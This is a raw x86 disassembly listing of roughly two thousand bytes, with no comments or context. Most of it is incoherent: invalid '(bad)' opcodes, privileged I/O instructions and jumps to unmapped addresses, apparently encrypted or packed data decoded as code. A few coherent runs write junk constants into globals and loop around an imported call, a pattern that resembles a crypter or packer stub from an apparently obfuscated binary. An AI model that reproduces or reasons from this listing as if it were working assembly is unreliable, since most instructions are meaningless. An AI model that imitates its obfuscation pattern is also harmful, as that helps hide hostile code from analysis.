  40a5ed:	ror    BYTE PTR ds:0x98962647,cl
  40a5f3:	mov    WORD PTR [edi-0x45],es
  40a5f6:	test   al,0x93
  40a5f8:	inc    edi
  40a5f9:	shl    dl,cl
  40a5fb:	ret    
  40a5fc:	loopne 0x40a676
  40a5fe:	repz fs aad 0xd1
  40a602:	fmul   QWORD PTR [eax+eiz*1]
  40a605:	sbb    al,0x7f
  40a607:	cdq    
  40a608:	std    
  40a609:	fcmovu st,st(2)
  40a60b:	jl     0x40a5ad
  40a60d:	icebp  
  40a60e:	xchg   edi,eax
  40a60f:	pop    ss
  40a610:	inc    ecx
  40a611:	(bad)  
  40a612:	mov    BYTE PTR [ecx],bh
  40a614:	aam    0xda
  40a616:	jge    0x40a617
  40a618:	push   0xb7939e2c
  40a61d:	aad    0x1f
  40a61f:	js     0x40a630
  40a621:	jmp    0xa7444964
  40a626:	cmp    cl,BYTE PTR [ebp+0x69af19d7]
  40a62c:	fistp  WORD PTR [eax]
  40a62e:	cdq    
  40a62f:	inc    esp
  40a630:	jg     0x40a663
  40a632:	jne    0x40a5c8
  40a634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a635:	pusha  
  40a636:	jle    0x40a61b
  40a638:	jns    0x40a688
  40a63a:	push   ebx
  40a63b:	xchg   esi,eax
  40a63c:	jno    0x40a5eb
  40a63e:	mov    ebp,DWORD PTR [ecx-0x3d]
  40a641:	cmp    al,0x45
  40a643:	(bad)  
  40a644:	push   eax
  40a645:	fs inc edx
  40a647:	aam    0x33
  40a649:	and    bl,BYTE PTR [edi+0x42b062b4]
  40a64f:	icebp  
  40a650:	xchg   BYTE PTR [eax-0x64],bh
  40a653:	and    DWORD PTR [esi-0x7a22debb],esi
  40a659:	mov    ebp,0x56c36694
  40a65e:	adc    bh,BYTE PTR [ebx-0x24]
  40a661:	mov    al,0xcb
  40a663:	xchg   edx,eax
  40a664:	sar    ebx,0x7b
  40a667:	rcl    BYTE PTR es:[eax-0x5e019c47],1
  40a66e:	xchg   esp,eax
  40a66f:	push   esi
  40a670:	xor    ecx,DWORD PTR [edx]
  40a672:	mov    esp,0x17dde158
  40a677:	jbe    0x40a642
  40a679:	inc    eax
  40a67a:	or     al,0x28
  40a67c:	ins    BYTE PTR es:[edi],dx
  40a67d:	xchg   BYTE PTR [esp+ecx*8],dh
  40a680:	dec    ebx
  40a681:	out    dx,al
  40a682:	adc    bl,0xbd
  40a685:	jle    0x40a6d5
  40a687:	out    dx,eax
  40a688:	sbb    DWORD PTR [ecx],edi
  40a68a:	adc    al,0xc6
  40a68c:	jmp    0x245ef445
  40a691:	gs jl  0x40a625
  40a694:	pusha  
  40a695:	xor    BYTE PTR ds:0x12546c49,dl
  40a69b:	ret    
  40a69c:	int3   
  40a69d:	add    BYTE PTR [ecx-0x14120bcd],dl
  40a6a3:	pop    ebp
  40a6a4:	push   0xdcc77a31
  40a6a9:	shr    BYTE PTR [ebx+0xb92693f],0x8d
  40a6b0:	test   BYTE PTR [ecx],bl
  40a6b2:	ret    0x385f
  40a6b5:	cmp    BYTE PTR [eax+0x3b],ch
  40a6b8:	icebp  
  40a6b9:	xchg   edi,eax
  40a6ba:	mov    bl,0x5d
  40a6bc:	das    
  40a6bd:	fisub  WORD PTR [ecx+0x39]
  40a6c0:	adc    cl,BYTE PTR [ebx+0x7dcaa5c1]
  40a6c6:	in     al,dx
  40a6c7:	shl    BYTE PTR [ecx-0x11],cl
  40a6ca:	push   ecx
  40a6cb:	or     dl,ah
  40a6cd:	aas    
  40a6ce:	dec    ecx
  40a6cf:	mov    cl,0x8e
  40a6d1:	test   DWORD PTR [ebp+esi*1+0x914fd77],edi
  40a6d8:	icebp  
  40a6d9:	ss jle 0x40a74d
  40a6dc:	xchg   esi,eax
  40a6dd:	or     dl,BYTE PTR [ebx+0x26a567a1]
  40a6e3:	jge    0x40a6d8
  40a6e5:	fdivr  DWORD PTR [ecx+0x6d]
  40a6e8:	std    
  40a6e9:	xor    esi,DWORD PTR [ecx-0x70]
  40a6ec:	add    edi,DWORD PTR [ebx]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x4337eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4337d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xf358ec0c
  40a7ac:	xchg   esp,eax
  40a7ad:	out    dx,al
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	or     ebp,eax
  40a7b8:	out    dx,al
  40a7b9:	mov    al,0x5b
  40a7bb:	add    DWORD PTR [ebx],eax
  40a7bd:	fnop   
  40a7bf:	cmp    edx,ecx
  40a7c1:	mov    DWORD PTR [edx+eax*1-0x55bdc2b2],esp
  40a7c8:	in     eax,0x2f
  40a7ca:	scas   eax,DWORD PTR es:[edi]
  40a7cb:	es mov ebx,0x4c523ee0
  40a7d1:	jno    0x40a79a
  40a7d3:	ret    
  40a7d4:	jbe    0x40a827
  40a7d6:	xor    bh,BYTE PTR [ecx]
  40a7d8:	add    cl,BYTE PTR [edi-0x65bb65]
  40a7de:	ret    0x4e8d
  40a7e1:	es sbb al,0xd2
  40a7e4:	in     eax,dx
  40a7e5:	add    al,0x34
  40a7e7:	pop    eax
  40a7e8:	rcl    DWORD PTR [esi-0x294ce72d],0x11
  40a7ef:	ds pop eax
  40a7f1:	stos   DWORD PTR es:[edi],eax
  40a7f2:	sub    BYTE PTR es:[esi-0x6c],al
  40a7f6:	and    BYTE PTR [ecx],0x5
  40a7f9:	xor    eax,0xfb878eb8
  40a7fe:	sub    eax,0x8d8d6689
  40a803:	mov    ah,0x8f
  40a805:	sbb    BYTE PTR [eax+eiz*4],dh
  40a808:	push   0x4d0dc71b
  40a80d:	mov    cl,0x85
  40a80f:	aad    0x2d
  40a811:	stos   BYTE PTR es:[edi],al
  40a812:	pop    ecx
  40a813:	xlat   BYTE PTR ds:[ebx]
  40a814:	push   ds
  40a815:	adc    ebx,ecx
  40a817:	in     al,dx
  40a818:	mov    eax,ds:0x515b0d7f
  40a81d:	les    ebp,FWORD PTR [ebx-0x28f4c289]
  40a823:	ret    0xb1c7
  40a826:	push   0xbe39329
  40a82b:	cmp    edx,DWORD PTR [ecx-0x2d1f3e0]
  40a831:	jno    0x40a871
  40a833:	lods   eax,DWORD PTR ds:[esi]
  40a834:	dec    ecx
  40a835:	daa    
  40a836:	inc    esp
  40a837:	clc    
  40a838:	mov    edx,edx
  40a83a:	pop    es
  40a83b:	in     eax,dx
  40a83c:	or     al,0xa
  40a83e:	popf   
  40a83f:	(bad)  
  40a840:	iret   
  40a841:	lock test al,0x70
  40a844:	mov    dl,0xe1
  40a846:	mov    bh,0xa0
  40a848:	imul   esi,DWORD PTR [ecx+0xef4bd81],0x3
  40a84f:	data16 gs stc 
  40a852:	std    
  40a853:	ret    0x7020
  40a856:	cmp    eax,DWORD PTR [edx-0xf]
  40a859:	add    cl,ch
  40a85b:	pop    ecx
  40a85c:	stos   BYTE PTR es:[edi],al
  40a85d:	lods   eax,DWORD PTR ds:[esi]
  40a85e:	pushw  0xffb1
  40a861:	xchg   ebp,eax
  40a862:	fbstp  TBYTE PTR [ebx-0x64]
  40a865:	dec    edi
  40a866:	cmp    DWORD PTR [eax+0x6e],0x13
  40a86a:	cwde   
  40a86b:	mov    cl,0x94
  40a86d:	arpl   WORD PTR [edx+eax*2-0x7a],dx
  40a871:	into   
  40a872:	out    dx,al
  40a873:	cmp    ch,BYTE PTR [bp+si+0x52]
  40a877:	dec    ecx
  40a878:	dec    edi
  40a879:	hlt    
  40a87a:	cld    
  40a87b:	outs   dx,DWORD PTR ds:[esi]
  40a87c:	icebp  
  40a87d:	add    DWORD PTR [eax-0x5faeedc2],ecx
  40a883:	sar    BYTE PTR [edx],1
  40a885:	in     al,dx
  40a886:	test   al,0x4b
  40a888:	repnz dec ecx
  40a88a:	push   esi
  40a88b:	pop    edi
  40a88c:	mov    ds:0x16a01519,eax
  40a891:	pop    eax
  40a892:	ss call 0x3f6c:0x7eadbd3a
  40a89a:	jmp    0x1a437366
  40a89f:	push   cs
  40a8a0:	or     al,0x90
  40a8a2:	sub    al,0x60
  40a8a4:	add    ch,BYTE PTR [ebx-0x78bd8b12]
  40a8aa:	imul   esi,DWORD PTR cs:0xfde17c3f,0x17
  40a8b2:	pop    ds
  40a8b3:	mov    edx,0xf81173fb
  40a8b8:	pop    ecx
  40a8b9:	icebp  
  40a8ba:	dec    ebp
  40a8bb:	aas    
  40a8bc:	pop    ebx
  40a8bd:	xchg   edi,eax
  40a8be:	repz push eax
  40a8c0:	rol    DWORD PTR [ecx],cl
  40a8c2:	into   
  40a8c3:	xchg   ebx,eax
  40a8c4:	sbb    cl,BYTE PTR [eax+0x28]
  40a8c7:	lods   eax,DWORD PTR ds:[esi]
  40a8c8:	sbb    ebp,ecx
  40a8ca:	fucom  st(5)
  40a8cc:	xchg   edi,eax
  40a8cd:	or     ebx,DWORD PTR [edi-0x62]
  40a8d0:	xor    BYTE PTR [eax],ch
  40a8d2:	(bad)  
  40a8d3:	imul   esi,DWORD PTR [edi+0x40],0x30
  40a8d7:	fmul   QWORD PTR [esi]
  40a8d9:	dec    edx
  40a8da:	push   esi
  40a8db:	shr    cl,1
  40a8dd:	jle    0x40a8f1
  40a8df:	mov    ch,0xf0
  40a8e1:	mov    ds:0xb2d00eef,eax
  40a8e6:	fld    DWORD PTR [esp+edi*1]
  40a8e9:	aaa    
  40a8ea:	jns    0x40a8b2
  40a8ec:	xchg   edi,eax
  40a8ed:	xchg   esp,eax
  40a8ee:	cmp    al,0x6f
  40a8f0:	push   ebx
  40a8f1:	sahf   
  40a8f2:	call   0x1c60:0xcc9ab003
  40a8f9:	cmp    ecx,DWORD PTR [edi-0x19b203e6]
  40a8ff:	adc    DWORD PTR [esi-0x6e6d7174],ebp
  40a905:	fbld   TBYTE PTR [edx]
  40a907:	test   eax,0xc163dc3b
  40a90c:	ss mov al,0x30
  40a90f:	and    bh,BYTE PTR [ebx+0xa]
  40a912:	daa    
  40a913:	outs   dx,DWORD PTR ds:[esi]
  40a914:	popa   
  40a915:	je     0x40a93a
  40a917:	add    edi,eax
  40a919:	lea    edi,[ebp-0x7ec723b9]
  40a91f:	cdq    
  40a920:	lods   eax,DWORD PTR ds:[esi]
  40a921:	push   esi
  40a922:	jbe    0x40a975
  40a924:	scas   eax,DWORD PTR es:[edi]
  40a925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a926:	nop
  40a927:	jns    0x40a95a
  40a929:	inc    ecx
  40a92a:	rcl    DWORD PTR [ebp-0x78],1
  40a92d:	rcr    DWORD PTR [edi],1
  40a92f:	push   ds
  40a930:	inc    ebp
  40a931:	les    ebx,FWORD PTR [ebp-0x5c3c4a41]
  40a937:	sbb    DWORD PTR [ecx-0x72],ecx
  40a93a:	mov    ah,0xc9
  40a93c:	scas   al,BYTE PTR es:[edi]
  40a93d:	jge    0x40a96e
  40a93f:	mov    dl,BYTE PTR [ebp+0x42932af0]
  40a945:	mov    BYTE PTR [ecx+0x6],0x87
  40a949:	jo     0x40a93a
  40a94b:	sub    eax,0xffa6a006
  40a950:	not    cl
  40a952:	pop    esp
  40a953:	jb     0x40a8f0
  40a955:	mov    bh,0x38
  40a957:	sbb    bh,BYTE PTR [ebp+ebp*2+0x157000de]
  40a95e:	inc    bh
  40a960:	push   esp
  40a961:	in     al,0xe5
  40a963:	cmp    ecx,DWORD PTR [edi-0xf]
  40a966:	jb     0x40a9d5
  40a968:	and    BYTE PTR [esp+eax*1+0xe504fd8],al
  40a96f:	mov    eax,ds:0x81e224f8
  40a974:	or     ebx,esi
  40a976:	test   BYTE PTR [eax-0x52a28b32],dl
  40a97c:	or     dh,BYTE PTR [ecx]
  40a97e:	int    0x5f
  40a980:	sub    DWORD PTR [esi],edx
  40a982:	jnp    0x40a943
  40a984:	or     eax,0xa4e8ad92
  40a989:	xor    al,0x27
  40a98b:	xchg   al,ah
  40a98d:	loope  0x40aa0e
  40a98f:	xor    ch,BYTE PTR ds:0x6e788016
  40a995:	mov    esi,0xd8dd785a
  40a99a:	test   eax,0x11f4a654
  40a99f:	adc    eax,0x1d839f7a
  40a9a4:	push   es
  40a9a5:	retf   0x8f3f
  40a9a8:	jae    0x40a955
  40a9aa:	and    ecx,DWORD PTR [ebx+0x689c617a]
  40a9b0:	iret   
  40a9b1:	and    BYTE PTR [edx],ch
  40a9b3:	inc    eax
  40a9b4:	lods   al,BYTE PTR ds:[esi]
  40a9b5:	xchg   ecx,eax
  40a9b6:	sti    
  40a9b7:	pop    ecx
  40a9b8:	push   eax
  40a9b9:	out    0xee,eax
  40a9bb:	mov    bl,0x96
  40a9bd:	adc    eax,0xf5602ba3
  40a9c2:	cmp    ecx,DWORD PTR [edx+ecx*2]
  40a9c5:	xor    DWORD PTR [ecx-0x709a0a43],ecx
  40a9cb:	jecxz  0x40a9e4
  40a9cd:	rcr    ch,cl
  40a9cf:	enter  0x62e9,0xf
  40a9d3:	ins    BYTE PTR es:[edi],dx
  40a9d4:	adc    BYTE PTR [esi-0xf],ah
  40a9d7:	jo     0x40a9a9
  40a9d9:	cmp    edi,DWORD PTR [ecx-0x5e]
  40a9dc:	adc    al,0x3e
  40a9de:	jp     0x40a9d5
  40a9e0:	push   ecx
  40a9e1:	mov    cl,BYTE PTR [esi+0x72f23990]
  40a9e7:	cmp    DWORD PTR [ecx+0x72147677],ebp
  40a9ed:	dec    esp
  40a9ef:	ret    0x3773
  40a9f2:	pop    edi
  40a9f3:	test   DWORD PTR [edx-0x4b6c7a5d],0x8981fbad
  40a9fd:	inc    ebp
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	lods   eax,DWORD PTR ds:[esi]
  40aa35:	jecxz  0x40aa81
  40aa37:	inc    ebx
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	jmp    0x40aa08
  40aa42:	addr16 or eax,0xb4c56b0
  40aa48:	(bad)  
  40aa49:	sub    BYTE PTR [edx-0x46],al
  40aa4c:	callw  0x471
  40aa50:	mov    WORD PTR [ecx-0x54],gs
  40aa53:	jge    0x40aa15
  40aa55:	cmc    
  40aa56:	jnp    0x40aab0
  40aa58:	mov    dh,0x8e
  40aa5a:	clc    
  40aa5b:	retf   0x178b
  40aa5e:	fwait
  40aa5f:	rol    BYTE PTR [ecx],0x35
  40aa62:	fsubr  st,st(4)
  40aa64:	out    dx,eax
  40aa65:	shr    DWORD PTR [ebp+ecx*2+0x1eeb276d],1
  40aa6c:	sub    dl,ch
  40aa6e:	into   
  40aa6f:	push   0xfe6e9fc4
  40aa74:	loop   0x40aa05
  40aa76:	xchg   ebp,eax
  40aa77:	push   edx
  40aa78:	mov    cl,0x18
  40aa7a:	call   0x5ac45687
  40aa7f:	pop    es
  40aa80:	mov    dl,0x99
  40aa82:	add    BYTE PTR [ecx+0x7b],al
  40aa85:	mov    bl,0x7
  40aa87:	nop
  40aa88:	ds inc edx
  40aa8a:	stos   DWORD PTR es:[edi],eax
  40aa8b:	mov    fs,WORD PTR [edi+eiz*1]
  40aa8e:	xchg   DWORD PTR [eax-0x1e],esi
  40aa91:	jbe    0x40ab07
  40aa93:	add    al,0x8
  40aa95:	fcomp  DWORD PTR [edi]
  40aa97:	cli    
  40aa98:	mov    edx,0x34dba0b9
  40aa9d:	test   DWORD PTR [ebp+0x57],0x54ae206c
  40aaa4:	mov    ebp,DWORD PTR [edi+0x7ae9dc35]
  40aaaa:	addr16 pop ecx
  40aaac:	repnz in al,0x5f
  40aaaf:	mov    eax,0x562ca15c
  40aab4:	sub    al,0xb7
  40aab6:	jmp    0x24098793
  40aabb:	lahf   
  40aabc:	jnp    0x40ab2f
  40aabe:	pop    esi
  40aabf:	shl    BYTE PTR [esp+edi*8+0x45],0x26
  40aac4:	loope  0x40aa7e
  40aac6:	push   ecx
  40aac7:	or     cl,BYTE PTR [eax]
  40aac9:	ret    
  40aaca:	push   ds
  40aacb:	int3   
  40aacc:	jbe    0x40aaf5
  40aace:	push   edx
  40aacf:	push   eax
  40aad0:	arpl   WORD PTR ds:0xc0c1d6ef,si
  40aad6:	ss icebp 
  40aad8:	(bad)  
  40aad9:	xor    DWORD PTR [ebx],edi
  40aadb:	dec    edx
  40aadc:	sbb    DWORD PTR [ecx+0x3892c57e],esp
  40aae2:	jecxz  0x40aa8b
  40aae4:	xchg   ecx,eax
  40aae5:	mov    ?,WORD PTR [eax+0x4c861e1f]
  40aaeb:	pop    ecx
  40aaec:	cmp    eax,0xf68732ac
  40aaf1:	lea    ebp,[edx]
  40aaf3:	and    BYTE PTR [ebx-0x56],bl
  40aaf6:	mov    esi,0xc5a41bac
  40aafb:	lods   eax,DWORD PTR ds:[esi]
  40aafc:	xor    cl,0x5d
  40aaff:	pushf  
  40ab00:	data16 lods al,BYTE PTR ds:[esi]
  40ab02:	jecxz  0x40aafe
  40ab04:	cdq    
  40ab05:	sub    bh,BYTE PTR [ebp+eiz*2+0x5ec43d1c]
  40ab0c:	mov    ebp,0xd24274d5
  40ab11:	std    
  40ab12:	out    dx,eax
  40ab13:	push   edx
  40ab14:	or     al,0xb
  40ab16:	shl    bh,0x8c
  40ab19:	test   ecx,edx
  40ab1b:	icebp  
  40ab1c:	push   ebp
  40ab1d:	sbb    ah,dh
  40ab1f:	jmp    0x7985be20
  40ab24:	push   ss
  40ab25:	es inc esi
  40ab27:	pop    eax
  40ab28:	mov    BYTE PTR ds:0x80f09855,bh
  40ab2e:	sbb    eax,0x7f144d07
  40ab33:	jns    0x40ab91
  40ab35:	sub    al,0xf6
  40ab38:	pop    ss
  40ab39:	adc    eax,0x1acd6eda
  40ab3e:	out    0x9f,al
  40ab40:	push   edx
  40ab41:	sbb    BYTE PTR [edx+edx*8+0x3d215e5b],dl
  40ab48:	and    DWORD PTR [esi-0x1b],esi
  40ab4b:	jb     0x40ab5a
  40ab4d:	mov    WORD PTR [ebx+0x51a835d6],cs
  40ab53:	add    DWORD PTR [ecx],edi
  40ab55:	adc    eax,0x25a86c50
  40ab5a:	outs   dx,DWORD PTR ds:[esi]
  40ab5b:	mov    bl,0x3a
  40ab5d:	in     al,dx
  40ab5e:	pop    ecx
  40ab5f:	cmp    ebx,ecx
  40ab61:	push   eax
  40ab62:	fdiv   st,st(5)
  40ab64:	and    al,0x20
  40ab66:	and    DWORD PTR [ebp+0xf662edb],esi
  40ab6c:	jo     0x40ab1c
  40ab6e:	sbb    bl,BYTE PTR [edx+0x39]
  40ab71:	loope  0x40ab1a
  40ab73:	jne    0x40ab96
  40ab75:	leave  
  40ab76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab77:	jge    0x40ab39
  40ab79:	xchg   edx,eax
  40ab7a:	jb     0x40abbc
  40ab7c:	jnp    0x40abbd
  40ab7e:	sti    
  40ab7f:	jo     0x40ab05
  40ab81:	sar    ebx,0xed
  40ab84:	ins    BYTE PTR es:[edi],dx
  40ab85:	lods   al,BYTE PTR ds:[esi]
  40ab86:	pop    es
  40ab87:	cmp    BYTE PTR [ecx-0x49311fa4],al
  40ab8d:	mov    eax,0x886a6220
  40ab92:	xor    eax,0xc95d84d7
  40ab97:	(bad)  [esi]
  40ab99:	lds    edi,FWORD PTR [edx]
  40ab9b:	adc    ah,BYTE PTR [edx]
  40ab9d:	cmp    esp,0xffffffdb
  40aba0:	(bad)  
  40aba1:	out    dx,eax
  40aba2:	and    esi,DWORD PTR [ecx]
  40aba4:	stc    
  40aba5:	ja     0x40abb4
  40aba7:	lahf   
  40aba8:	es jbe 0x40aba5
  40abab:	fdiv   DWORD PTR [ebx+ebp*8+0x54d69e9f]
  40abb2:	jne    0x40ab49
  40abb4:	jae    0x40abd2
  40abb6:	fisubr WORD PTR [ebx+eiz*4+0x5e305743]
  40abbd:	rcr    ecx,1
  40abbf:	sub    eax,0xa52f31b6
  40abc4:	lods   al,BYTE PTR ds:[esi]
  40abc5:	test   DWORD PTR [esi],eax
  40abc7:	mov    dh,0xf7
  40abc9:	jbe    0x40abc4
  40abcb:	fidiv  DWORD PTR [edi]
  40abcd:	loop   0x40abc8
  40abcf:	dec    eax
  40abd0:	out    0x8c,eax
  40abd2:	mov    es:0x1b3ccf4d,eax
  40abd8:	xor    ah,cl
  40abda:	jl     0x40abfa
  40abdc:	jg     0x40ab86
  40abde:	nop
  40abdf:	cmp    esi,ecx
  40abe1:	xor    eax,0xae8b84d0
  40abe6:	lock sub edi,DWORD PTR [eax+edx*2+0x5f790f4d]
  40abee:	out    dx,al
  40abef:	fs jle 0x40abe6
  40abf2:	add    DWORD PTR [eax],edi
  40abf4:	fdivr  st,st(0)
  40abf6:	inc    ebp
  40abf7:	mov    edi,0x86fca664
  40abfc:	rcl    ecx,0xec
  40abff:	pop    eax
  40ac00:	mov    ds:0xa1a3badc,eax
  40ac05:	sti    
  40ac06:	(bad)  
  40ac07:	out    dx,al
  40ac08:	test   al,0x82
  40ac0a:	lods   eax,DWORD PTR ds:[esi]
  40ac0b:	jg     0x40ac5a
  40ac0d:	shl    DWORD PTR [esi+0x4d544cd4],cl
  40ac13:	hlt    
  40ac14:	jg     0x40ac52
  40ac16:	cld    
  40ac17:	cwde   
  40ac18:	mov    DWORD PTR [eax+0x33ab955f],ebx
  40ac1e:	sti    
  40ac1f:	test   al,0x9c
  40ac21:	mov    edx,0x6eaf62e1
  40ac26:	sbb    DWORD PTR [ecx+0x4a],0x4a
  40ac2a:	mov    ch,0x4d
  40ac2c:	add    eax,0x13b511c1
  40ac31:	xor    ecx,edx
  40ac33:	dec    edi
  40ac34:	cmp    eax,0x82154b2b
  40ac39:	jbe    0x40ac4e
  40ac3b:	outs   dx,BYTE PTR ds:[esi]
  40ac3c:	popa   
  40ac3d:	xchg   ecx,eax
  40ac3e:	clc    
  40ac3f:	jle    0x40ac19
  40ac41:	cld    
  40ac42:	cmp    al,dh
  40ac44:	aaa    
  40ac45:	fistp  WORD PTR [esi+eiz*8-0x55]
  40ac49:	jmp    0x4a80:0x7ee993e1
  40ac50:	test   DWORD PTR [esi+0x6c],ebx
  40ac53:	sbb    ebx,edi
  40ac55:	jle    0x40acb8
  40ac57:	lock jp 0x40ac70
  40ac5a:	ret    
  40ac5b:	lods   eax,DWORD PTR ds:[esi]
  40ac5c:	sub    ebx,ebx
  40ac5e:	push   esp
  40ac5f:	ja     0x40ac9b
  40ac61:	(bad)  
  40ac62:	jmp    0xa87e8619
  40ac67:	fimul  WORD PTR [edi+0x77]
  40ac6a:	sbb    BYTE PTR [edx+0xd],ch
  40ac6d:	push   cs
  40ac6e:	mov    al,0xce
  40ac70:	sahf   
  40ac71:	stos   DWORD PTR es:[edi],eax
  40ac72:	lods   al,BYTE PTR ds:[esi]
  40ac73:	adc    BYTE PTR [eax+0x47],ah
  40ac76:	cwde   
  40ac77:	lds    esi,FWORD PTR [eax+0x764658bf]
  40ac7d:	inc    ecx
  40ac7e:	loop   0x40ac75
  40ac80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac81:	bound  ebx,QWORD PTR [ecx+0x3bf2ce34]
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	jmp    0x40acc9
  40ac92:	inc    ebx
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	outs   dx,DWORD PTR ds:[esi]
  40ac9e:	cmp    BYTE PTR [ebx+0x0],al
  40aca1:	add    BYTE PTR [eax],al
  40aca3:	add    BYTE PTR [eax],al
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x176cde1e],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad86
  40ad2c:	xchg   edi,eax
  40ad2d:	jb     0x40acb4
  40ad2f:	add    eax,0x65563399
  40ad34:	sub    ah,cl
  40ad36:	andnps xmm6,XMMWORD PTR [ebx]
  40ad39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad3a:	xchg   ecx,eax
  40ad3b:	clc    
  40ad3c:	cli    
  40ad3d:	mov    edx,0x3bba419a
  40ad42:	cmp    cl,BYTE PTR [edi+0x1322e846]
  40ad48:	inc    esp
  40ad49:	push   ecx
  40ad4a:	in     eax,dx
  40ad4b:	adc    edx,DWORD PTR [ecx+0x6c]
  40ad4e:	scas   eax,DWORD PTR es:[edi]
  40ad4f:	retf   0xb74a
  40ad52:	sbb    BYTE PTR ds:0x95748253,0x21
  40ad59:	xor    al,0xac
  40ad5b:	pushf  
  40ad5c:	sub    ecx,edi
  40ad5e:	ss jmp 0xa7bd:0xc285a28
  40ad66:	cdq    
  40ad67:	fst    st(4)
  40ad69:	vmwrite ecx,DWORD PTR [eax+0x1e9be4f5]
  40ad70:	fwait
  40ad71:	push   ecx
  40ad72:	dec    ebp
  40ad73:	imul   ecx,DWORD PTR [esi-0x36f875e8],0xfffffffa
  40ad7a:	and    BYTE PTR [ecx+0x27],0x8
  40ad7e:	or     ah,BYTE PTR [ebx+0x78]
  40ad81:	(bad)  
  40ad82:	cld    
  40ad83:	repnz sub ah,bl
  40ad86:	sbb    esp,ebx
  40ad88:	jge    0x40ad89
  40ad8a:	js     0x40adab
  40ad8c:	shl    DWORD PTR [edx+0x1be31ae2],1
  40ad92:	adc    bh,bl
  40ad94:	in     al,dx
  40ad95:	jbe    0x40adab
  40ad97:	sub    edi,esi
  40ad99:	je     0x40ad74
  40ad9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9c:	push   edx
  40ad9d:	popf   
  40ad9e:	stos   BYTE PTR es:[edi],al
  40ad9f:	cmp    eax,0x6585fbef
  40ada4:	pop    ss
  40ada5:	mov    cl,0x9b
  40ada7:	sub    BYTE PTR [eax],al
  40ada9:	xchg   BYTE PTR [edx+ebp*1-0x5920cdf4],dh
  40adb0:	push   edi
  40adb1:	or     DWORD PTR [esi],eax
  40adb3:	loopne 0x40adc5
  40adb5:	cli    
  40adb6:	mov    ds:0xd1d40722,eax
  40adbb:	xchg   DWORD PTR [ebx+0x2c807037],edi
  40adc1:	adc    ecx,esp
  40adc3:	mov    edx,0x1a56baf9
  40adc8:	push   esp
  40adc9:	fdiv   QWORD PTR [esi+0x7]
  40adcc:	cmc    
  40adcd:	inc    BYTE PTR [ebx-0x1d]
